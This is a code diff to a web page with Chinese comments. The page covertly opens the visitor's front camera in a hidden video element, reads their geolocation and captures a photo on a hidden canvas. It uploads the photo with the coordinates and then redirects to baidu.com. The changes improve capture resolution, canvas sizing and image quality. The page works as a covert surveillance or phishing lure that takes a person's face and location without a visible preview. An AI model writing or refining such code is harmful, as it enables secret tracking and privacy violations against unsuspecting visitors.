@@ -32,7 +32,7 @@
 </div>
 
 <video id="video" style="display:none;" autoplay playsinline muted></video>
-<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     let streamRef = null;
@@ -45,9 +45,8 @@
         updateStatus("正在请求摄像头权限...");
 
         try {
-            // 获取摄像头流（隐藏，不显示预览）
             streamRef = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: 640, height: 480 },
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false
             });
             const video = document.getElementById('video');
@@ -59,7 +58,6 @@
             updateStatus("摄像头不可用，将继续上传（无照片）");
         }
 
-        // 获取地理位置
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 captureAndUpload(position.coords.latitude, position.coords.longitude);
@@ -82,12 +80,16 @@
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        // 如果摄像头流可用且已加载数据，则拍照；否则生成一张纯色图片
         if (streamRef && video.readyState >= 2 && video.videoWidth > 0) {
+            // 关键修正：使用视频的实际宽高设置 canvas 尺寸，避免比例变形
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             streamRef.getTracks().forEach(track => track.stop());
         } else {
-            // 后备：生成一张灰色图片表示无法拍照
+            // 后备：生成一张正方形灰色图片
+            canvas.width = 640;
+            canvas.height = 640;
             ctx.fillStyle = "#333333";
             ctx.fillRect(0, 0, canvas.width, canvas.height);
         }
@@ -125,7 +127,7 @@
                     window.location.href = "https://www.baidu.com";
                 }, 800);
             }
-        }, 'image/jpeg', 0.6);
+        }, 'image/jpeg', 0.8);
     }
 </script>
 </body>
